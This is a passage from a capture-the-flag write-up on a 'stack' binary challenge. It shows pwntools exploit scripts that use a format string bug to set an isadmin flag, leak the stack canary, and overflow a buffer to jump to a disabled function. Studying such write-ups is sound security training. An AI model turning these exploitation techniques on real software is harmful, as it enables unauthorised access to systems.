<span class="normal"><a href="#__codelineno-2-8">8</a></span>
<span class="normal"><a href="#__codelineno-2-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>Enter your name: 
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>a
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>Welcome user: 
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>a
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>1. Admin panel
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>2. Change your name
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>3. Reason you (the user) are here
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>What do you want to do? 
</span></code></pre></div></td></tr></tbody></table></div>
<p>Running the program to analyse what it's supposed to do, we'll see that it basically just get our name and print it and other options are either disable or we don't have access to them.</p>
<p>This leaves us with two options, first buffer overflow which is not possible at this point becuase the canary is enable (We know it from checksec command) so this leaves us with only one more thing to try.</p>
<h2 id="format-string">Format String</h2>
<p><a href="https://owasp.org/www-community/attacks/Format_string_attack">Owasp</a>
</p><div class="language-text highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
<span class="normal"><a href="#__codelineno-3-2">2</a></span>
<span class="normal"><a href="#__codelineno-3-3">3</a></span>
<span class="normal"><a href="#__codelineno-3-4">4</a></span>
<span class="normal"><a href="#__codelineno-3-5">5</a></span>
<span class="normal"><a href="#__codelineno-3-6">6</a></span>
<span class="normal"><a href="#__codelineno-3-7">7</a></span>
<span class="normal"><a href="#__codelineno-3-8">8</a></span>
<span class="normal"><a href="#__codelineno-3-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>Enter your name: 
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>%p
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>Welcome user: 
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>0x1
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a>1. Admin panel
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>2. Change your name
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>3. Reason you (the user) are here
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>What do you want to do? 
</span></code></pre></div></td></tr></tbody></table></div><p></p>
<p>I won't explain the format string vulnerability here, as I plan to write detailed posts about it and other topics related to pwn. I will provide a link to those posts later.</p>
<p>So now we know the vulenrability that we have but what can we do with it? Well first of all we can get the value of canary so we can exploit bof if there is one in the program. We have arbitary read and write usually with format string and well there is alot we can do but first let's see what do we need.</p>
<h2 id="assembly-is-fun">Assembly is fun</h2>
<p>Ah s**t, here we go again.
Jokes aside usually assembly isn't that frustrating, It's just a puzzle you need to solve using time and effort whether for reversing and cracking or exploiting or etc.</p>
<p>I'll use r2 (radare2) for this challenge. Let's check the functions.</p>
<p></p><div class="language-bash highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-4-10">10</a></span>
<span class="normal"><a href="#__codelineno-4-11">11</a></span>
<span class="normal"><a href="#__codelineno-4-12">12</a></span>
<span class="normal"><a href="#__codelineno-4-13">13</a></span>
<span class="normal"><a href="#__codelineno-4-14">14</a></span>
<span class="normal"><a href="#__codelineno-4-15">15</a></span>
<span class="normal"><a href="#__codelineno-4-16">16</a></span>
<span class="normal"><a href="#__codelineno-4-17">17</a></span>
<span class="normal"><a href="#__codelineno-4-18">18</a></span>
<span class="normal"><a href="#__codelineno-4-19">19</a></span>
<span class="normal"><a href="#__codelineno-4-20">20</a></span>
<span class="normal"><a href="#__codelineno-4-21">21</a></span>
<span class="normal"><a href="#__codelineno-4-22">22</a></span>
<span class="normal"><a href="#__codelineno-4-23">23</a></span>
<span class="normal"><a href="#__codelineno-4-24">24</a></span>
<span class="normal"><a href="#__codelineno-4-25">25</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="o">[</span>0x7f1e458679c0<span class="o">]</span>&gt;<span class="w"> </span>afl
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>0x004010d0<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">34</span><span class="w">           </span>entry0
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>0x00401110<span class="w">    </span><span class="m">4</span><span class="w"> </span><span class="m">33</span><span class="w">   </span>-&gt;<span class="w"> </span><span class="m">31</span><span class="w">   </span>sym.deregister_tm_clones
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>0x00401140<span class="w">    </span><span class="m">4</span><span class="w"> </span><span class="m">49</span><span class="w">           </span>sym.register_tm_clones
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>0x00401180<span class="w">    </span><span class="m">3</span><span class="w"> </span><span class="m">33</span><span class="w">   </span>-&gt;<span class="w"> </span><span class="m">32</span><span class="w">   </span>sym.__do_global_dtors_aux
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>0x004011b0<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>entry.init0
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>0x00401204<span class="w">   </span><span class="m">11</span><span class="w"> </span><span class="m">155</span><span class="w">          </span>sym.admin
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>0x0040147c<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">9</span><span class="w">            </span>sym._fini
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>0x0040129f<span class="w">    </span><span class="m">4</span><span class="w"> </span><span class="m">44</span><span class="w">           </span>sym.ac
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>0x004011b6<span class="w">    </span><span class="m">3</span><span class="w"> </span><span class="m">78</span><span class="w">           </span>sym.itguy
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>0x00401030<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.puts
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>0x00401080<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.gets
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>0x00401040<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.__stack_chk_fail
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>0x004012cb<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">22</span><span class="w">           </span>sym.func
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>0x00401100<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">1</span><span class="w">            </span>sym._dl_relocate_static_pie
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a>0x004012e1<span class="w">   </span><span class="m">10</span><span class="w"> </span><span class="m">250</span><span class="w">          </span>main
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>0x004013db<span class="w">    </span><span class="m">5</span><span class="w"> </span><span class="m">160</span><span class="w">          </span>sym.disablefunction
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18"></a>0x00401000<span class="w">    </span><span class="m">3</span><span class="w"> </span><span class="m">23</span><span class="w">           </span>sym._init
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19"></a>0x00401050<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.printf
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20"></a>0x00401060<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.fgets
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21"></a>0x00401070<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.getchar
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22"></a>0x00401090<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.fopen
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23"></a>0x004010a0<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.perror
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24"></a>0x004010b0<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.__isoc99_scanf
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25"></a>0x004010c0<span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">6</span><span class="w">            </span>sym.imp.exit
</span></code></pre></div></td></tr></tbody></table></div>
If you are experienced in reversing, you will immediately notice the five interesting functions. But if you are not familiar with it, don't worry, you don't need to read all the functions. Start with the main function and check the custom functions inside it, then keep going.
Let's take a look at the main function.
<a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../images/pwn-3-main.png" data-desc-position="bottom"><img alt="Main function disassemble" src="../images/pwn-3-main.png" title="Main function disassemble"></a>
Alright, here is the 4 functionalities of menu. let's examine what's inside the func and ac functions, which correspond to option number three and one, respectively.
<a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../images/pwn-3-two-func.png" data-desc-position="bottom"><img alt="func and ac functions disassemble" src="../images/pwn-3-two-func.png" title="func and ac functions disassemble"></a>
As we expected, the func function was empty, but the ac function is interesting. (Admin panel functionality) Why? becuase of the obj.isadmin variable, which is set to zero. This is why we can't login to the admin section. We can exploit format string to change that valueand this is the reason that disabled pie is good for us, even though it's not impossible to obtain the Vaddr of the object with enabled PIE. It's just easier without it, and in this case, we got lucky.<p></p>
<h2 id="exploiting">Exploiting</h2>
<p>Let's get into admin panel.
First we need to find the object virtual address which can be accomplished in many different ways. Since I'm already in the r2 so I'll just run <code>px @obj.isadmin</code> and write the address.</p>
<div class="language-bash highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
<span class="normal"><a href="#__codelineno-5-2">2</a></span>
<span class="normal"><a href="#__codelineno-5-3">3</a></span>
<span class="normal"><a href="#__codelineno-5-4">4</a></span>
<span class="normal"><a href="#__codelineno-5-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="o">[</span>0x7f1e458679c0<span class="o">]</span>&gt;<span class="w"> </span>px<span class="w"> </span>@obj.isadmin
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>-<span class="w"> </span>offset<span class="w"> </span>-<span class="w">   </span><span class="m">0</span><span class="w"> </span><span class="m">1</span><span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">3</span><span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">5</span><span class="w">  </span><span class="m">6</span><span class="w"> </span><span class="m">7</span><span class="w">  </span><span class="m">8</span><span class="w"> </span><span class="m">9</span><span class="w">  </span>A<span class="w"> </span>B<span class="w">  </span>C<span class="w"> </span>D<span class="w">  </span>E<span class="w"> </span>F<span class="w">  </span>0123456789ABCDEF
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>0x0040406c<span class="w">  </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w">  </span>................<span class="w">                                                                                                                                                                       </span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>0x0040407c<span class="w">  </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w">  </span>................
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>0x0040408c<span class="w">  </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w"> </span><span class="m">0000</span><span class="w">  </span>................
</span></code></pre></div></td></tr></tbody></table></div>
<p>Now I'm going to use pwntools library and write an exploit for this section to see what is going on in the admin panel.</p>
<p>Try it out yourself first but here's the code I wrote:</p>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../images/pwn-3-admin.png" data-desc-position="bottom"><img alt="Admin Panel Exploit" src="../images/pwn-3-admin.png" title="Admin panel exploit"></a>
Before going further, let's explain what is happening in the code.</p>
<p>Well basically the code is getting the object addr automatically (I love automating), and generating and sending the payload for us to change that value but what's that 8 and how did I get that?</p>
<p>The 8 is the offset for format string, basically the number that we can see our own input using format string. I found it as easy as just entring multiple <code>%p %p</code> and then checked which index was my input (I knew the hex code of my input) and the dictionary is to define change <em>where</em> to <em>what</em>.</p>
<h3 id="canary">Canary üê¶</h3>
<p>Canary is static all over the program so once we capture it we can use it in one or another function it's not changing. Now how can we get that? Yeah using format string again we just need to find the offset and for that we'll use r2 to see what is the canary by examining fs+0x28 (or something else if it's different in the check) and get the value of that and then manually or automatically we check every offset to the value we got.</p>
<div class="language-python3 highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-6-10">10</a></span>
<span class="normal"><a href="#__codelineno-6-11">11</a></span>
<span class="normal"><a href="#__codelineno-6-12">12</a></span>
<span class="normal"><a href="#__codelineno-6-13">13</a></span>
<span class="normal"><a href="#__codelineno-6-14">14</a></span>
<span class="normal"><a href="#__codelineno-6-15">15</a></span>
<span class="normal"><a href="#__codelineno-6-16">16</a></span>
<span class="normal"><a href="#__codelineno-6-17">17</a></span>
<span class="normal"><a href="#__codelineno-6-18">18</a></span>
<span class="normal"><a href="#__codelineno-6-19">19</a></span>
<span class="normal"><a href="#__codelineno-6-20">20</a></span>
<span class="normal"><a href="#__codelineno-6-21">21</a></span>
<span class="normal"><a href="#__codelineno-6-22">22</a></span>
<span class="normal"><a href="#__codelineno-6-23">23</a></span>
<span class="normal"><a href="#__codelineno-6-24">24</a></span>
<span class="normal"><a href="#__codelineno-6-25">25</a></span>
<span class="normal"><a href="#__codelineno-6-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="n">e</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./stack"</span><span class="p">)</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="n">isadmin</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"isadmin"</span><span class="p">]</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">{</span><span class="n">isadmin</span><span class="p">:</span> <span class="mi">1</span><span class="p">}))</span>
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10"></a>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12"></a>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13"></a><span class="c1"># Attach r2 using pid and examine the 16bit value of fs+0x28 and get out of process interactive and put canary in the if below and we got the offset.</span>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14"></a>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16"></a>    <span class="k">try</span><span class="p">:</span>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17"></a>        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'2'</span><span class="p">)</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18"></a>        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"$p"</span><span class="p">)</span>
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19"></a>        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Welcome user'</span><span class="p">)</span>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20"></a>        <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21"></a>        <span class="n">a</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22"></a>        <span class="k">if</span> <span class="sa">b</span><span class="s1">'0xb1d00ccebad82000'</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23"></a>            <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24"></a>            <span class="k">break</span>
</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26"></a>        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></code></pre></div></td></tr></tbody></table></div>
<p>Read the comment in the code...</p>
<h2 id="the-bof-xd">THE BOF xD</h2>
<p>now we have the canary offset and able to get to the bof all that is left to do is to find the bof offset and write the exploit.</p>
<div class="language-python3 highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-7-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-7-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-7-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-7-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-7-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-7-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-7-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-7-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-7-10">10</a></span>
<span class="normal"><a href="#__codelineno-7-11">11</a></span>
<span class="normal"><a href="#__codelineno-7-12">12</a></span>
<span class="normal"><a href="#__codelineno-7-13">13</a></span>
<span class="normal"><a href="#__codelineno-7-14">14</a></span>
<span class="normal"><a href="#__codelineno-7-15">15</a></span>
<span class="normal"><a href="#__codelineno-7-16">16</a></span>
<span class="normal"><a href="#__codelineno-7-17">17</a></span>
<span class="normal"><a href="#__codelineno-7-18">18</a></span>
<span class="normal"><a href="#__codelineno-7-19">19</a></span>
<span class="normal"><a href="#__codelineno-7-20">20</a></span>
<span class="normal"><a href="#__codelineno-7-21">21</a></span>
<span class="normal"><a href="#__codelineno-7-22">22</a></span>
<span class="normal"><a href="#__codelineno-7-23">23</a></span>
<span class="normal"><a href="#__codelineno-7-24">24</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="n">e</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./stack"</span><span class="p">)</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="n">isadmin</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"isadmin"</span><span class="p">]</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8"></a>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">{</span><span class="n">isadmin</span><span class="p">:</span> <span class="mi">1</span><span class="p">}))</span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10"></a><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'2</span><span class="se">\n</span><span class="s1">%17$p'</span><span class="p">)</span>
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12"></a>
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13"></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Welcome user'</span><span class="p">)</span>
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14"></a><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15"></a>
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16"></a><span class="n">canary</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17"></a>
</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18"></a><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mi">24</span> <span class="c1"># Padding</span>
</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="c1"># Canary value</span>
</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span> <span class="c1"># Padding again</span>
</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'disablefunction'</span><span class="p">])</span> <span class="c1"># Address of disabled function</span>
</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'1</span><span class="se">\n</span><span class="s1">2</span><span class="se">\n</span><span class="s1">'</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># BOF</span>
</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23"></a>
</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24"></a><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span> <span class="c1"># Get the flag</span>
</span></code></pre></div></td></tr></tbody></table></div>
<h1 id="authors">Authors</h1>
<blockquote>
<p>Written by <a href="https://github.com/D4rkNebula">D4rkNebula</a></p>
</blockquote>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
